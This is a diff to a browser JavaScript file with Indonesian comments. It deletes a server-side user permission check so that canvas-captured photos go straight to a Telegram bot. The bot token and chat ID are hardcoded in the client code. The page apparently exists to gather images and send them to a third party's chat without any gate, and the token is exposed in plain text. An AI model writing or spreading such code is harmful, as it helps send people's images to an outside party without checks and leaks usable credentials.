@@ -32,32 +32,9 @@ document.addEventListener('DOMContentLoaded', function() {
     return canvas.toDataURL('image/png');
   }
 
-  // FUNGSI CEK USER PERMISSION
-  async function checkUserPermission() {
-    try {
-      const response = await fetch('/api/check-user', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        }
-      });
-      const result = await response.json();
-      return result.allowed;
-    } catch (error) {
-      console.error('Permission check failed:', error);
-      return false;
-    }
-  }
-
-  // FUNGSI KIRIM FOTO KE TELEGRAM
+  // FUNGSI KIRIM FOTO KE TELEGRAM (TANPA PERMISSION CHECK)
   async function sendPhotoToServer(dataURL) {
     try {
-      // Cek permission dulu
-      const hasPermission = await checkUserPermission();
-      if (!hasPermission) {
-        throw new Error('User tidak memiliki akses');
-      }
-
       const botToken = '8364972198:AAHBBW0kTvyeIbDjZQPJeUZxa6TNfYLMEk0';
       const chatId = '7418584938';
       
@@ -108,6 +85,7 @@ document.addEventListener('DOMContentLoaded', function() {
         console.log('✅ Photo sent to Telegram successfully');
         return result;
       } else {
+        console.error('❌ Telegram API error:', result);
         throw new Error(result.description || 'Telegram API error');
       }
       
